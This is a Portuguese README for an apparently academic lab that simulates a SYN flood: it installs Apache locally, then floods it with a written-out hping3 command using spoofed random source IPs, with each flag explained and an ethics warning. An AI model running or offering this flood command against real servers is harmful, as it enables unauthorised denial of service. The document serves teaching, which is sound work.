
---

# Simulação de Ataque DDoS  

Este projeto tem como objetivo simular um ataque DDoS (Distributed Denial of Service) em um servidor, utilizando a técnica **SYN Flood** para explorar vulnerabilidades na camada de transporte do modelo OSI.

---

## 📋 Sobre o Ataque  

### SYN Flood  
O **SYN Flood** é um tipo de ataque de negação de serviço (Denial of Service - DoS) que utiliza requisições TCP SYN para sobrecarregar o servidor, esgotando seus recursos e impedindo que ele processe novas conexões legítimas.

---

## 🚀 Preparação do Ambiente  

### Requisitos  
1. **Sistema Operacional Linux:** Utilize o **WSL2** (Windows Subsystem for Linux) para executar o subsistema Linux.  
2. **Ferramentas Necessárias:**  
   - Apache Server  
   - Hping3  

---

## 🛠️ Passo a Passo  

### 1. Configuração do Servidor  

#### Instalar o Apache Server  
Execute o comando abaixo para instalar o servidor Apache:  

```bash  
sudo apt-get install apache2  
```  

#### Iniciar o Servidor  
Ative e inicie o serviço do Apache:  

```bash  
sudo systemctl enable apache2  
sudo systemctl start apache2  
```  

#### Verificar o Status do Servidor  
Certifique-se de que o servidor está rodando:  

```bash  
sudo systemctl status apache2  
```  

#### Acessar o Conteúdo do Servidor  
1. Descubra o IP local do servidor:  
   ```bash  
   hostname -I  
   ```  
   (O comando retorna o IP local. Use a letra "I" maiúscula.)  
2. Copie o IP retornado e cole no navegador. A página inicial do servidor será exibida.  

---

### 2. Realizar o Ataque  

#### Instalar o Hping3  
Instale a ferramenta **hping3**, que será usada para simular o ataque:  

```bash  
sudo apt install hping3  
```  

#### Executar o Ataque SYN Flood  
Utilize o seguinte comando para realizar o ataque no servidor:  

```bash  
sudo hping3 -S -p 80 --flood --rand-source [IP_DO_SERVIDOR]  
```  

- **-S**: Envia pacotes SYN.  
- **-p 80**: Alvo na porta 80 (HTTP).  
- **--flood**: Envia pacotes continuamente.  
- **--rand-source**: Usa IPs de origem aleatórios.  
- **[IP_DO_SERVIDOR]**: Substitua pelo IP do servidor identificado no passo anterior.  

---

## ⚠️ Avisos  

- **Uso Ético:** Este trabalho é destinado exclusivamente para fins acadêmicos. Ataques DDoS são ilegais se realizados sem autorização.  
- **Impacto:** Realize o teste em um ambiente controlado para evitar prejudicar outros sistemas.  

--- 

Com essa estrutura, o conteúdo está mais organizado, com explicações claras e formatadas.


Repositórios de referência: https://github.com/dunossauro/live-de-python/blob/main/codigo/Live206/dunotop.py